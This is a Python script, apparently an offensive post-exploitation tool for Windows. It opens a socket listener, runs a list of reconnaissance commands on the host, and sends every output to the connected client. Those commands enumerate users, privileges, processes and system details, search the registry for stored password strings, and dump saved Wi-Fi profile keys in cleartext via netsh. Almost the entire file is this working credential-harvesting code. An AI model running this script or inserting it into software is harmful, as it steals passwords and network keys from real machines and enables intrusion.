#!/usr/bin/python3
import socket
import subprocess
import os
from datetime import datetime
import re

# Get user input for setup
listener_address = input("Listener IP Address (ENTER for 127.0.0.1): ") or '127.0.0.1'
listener_port = input("Listener Port (ENTER for 8008): ") or '8008'
listener_port = int(listener_port)  # Convert port to integer

save_file = input("Do you want to save results? (Y/N): ").strip().upper()

# Initialize the log file if required
log_file_path = 'log.txt' if save_file == 'Y' else None

if log_file_path:
    mode = 'a' if os.path.exists(log_file_path) else 'w'
    with open(log_file_path, mode) as file:
        if mode == 'w':
            file.write('Begin Log: \n')
        file.write(f'New Log Entry: {datetime.now()}\n')
    print(f"Saving results to {log_file_path}")
else:
    print("Not saving results.")

# Set up socket
try:
    my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    my_socket.bind((listener_address, listener_port))
    my_socket.listen(1)
    print(f"Listener connected on {listener_address}:{listener_port}")
    print("<CTRL>+C to quit.")
except socket.error as e:
    print(f"Socket error: {e}")
    exit(1)

# Accept incoming connection
try:
    conn, addr = my_socket.accept()
    print(f"Connection from {addr}")
except socket.error as e:
    print(f"Error accepting connection: {e}")
    my_socket.close()
    exit(1)

# Track the current directory
current_dir = os.getcwd()  # Start in the script's directory

# Function to execute commands via subprocess and return output
def run_command(command):
    global current_dir
    
    # Special handling for 'cd' command to change directories
    if command.startswith('cd'):
        try:
            new_dir = command.split(' ', 1)[1].strip()
            if new_dir == "":
                new_dir = os.path.expanduser("~")  # Default to home directory if no dir provided
            os.chdir(new_dir)
            current_dir = os.getcwd()
            return f"Changed directory to {current_dir}\n"
        except FileNotFoundError:
            return f"Directory not found: {new_dir}\n"
        except IndexError:
            return "No directory specified\n"
    
    try:
        # Execute the command using subprocess in the current directory
        result = subprocess.run(command, capture_output=True, text=True, shell=True, cwd=current_dir)
        output = result.stdout if result.stdout else result.stderr  # Prefer stdout, fallback to stderr
        return output
    except Exception as e:
        return str(e)

# Retrieve the hostname of the system
hostname_command = "hostname"
hostname = run_command(hostname_command).strip()
print(f"Hostname retrieved: {hostname}")

# List of commands to automate
command_list = [
    "whoami /all",  # Determine what access we have established
    "net user",     # Get existing user account information
    "hostname",     # Check NetBIOS name using hostname
    "ipconfig",     # Display IP configuration
    "systeminfo",   # Get system information
    "tasklist",     # Get running program list
    "fsutil fsinfo drives",  # Get drive information
    "reg query HKLM /f password /t REG_SZ /s",  # Search for Windows password values
    "reg query HKCU /f pass /t REG_SZ /s"
]

# Get known wireless networks
wifi_command = "netsh wlan show profile"
wifi_output = run_command(wifi_command)
ssids = re.findall(r'All User Profile\s+:\s+(.*)', wifi_output)  # Regex to find SSIDs

if ssids:
    for ssid in ssids:
        ssid_command = f"netsh wlan show profile \"{ssid.strip()}\" key=clear"
        command_list.append(ssid_command)

# Main loop to run automated commands and return output
try:
    for command in command_list:
        print(f"Executing command: {command}")
        # Log command if necessary
        if log_file_path:
            with open(log_file_path, 'a') as file:
                file.write(f"{datetime.now()}: Executing Command: {command}\n")

        # Execute the command and capture output
        output = run_command(command)

        # Send the output back to the client
        if output:
            conn.sendall(output.encode('utf-8'))
        else:
            conn.sendall(b"No output.\n")

        # Log output if necessary
        if log_file_path:
            with open(log_file_path, 'a') as file:
                file.write(f"{datetime.now()}: Command Output: {output}\n")
                file.write("\n")  # Add a newline for better separation

finally:
    conn.close()
    my_socket.close()
    print("Connection closed.")
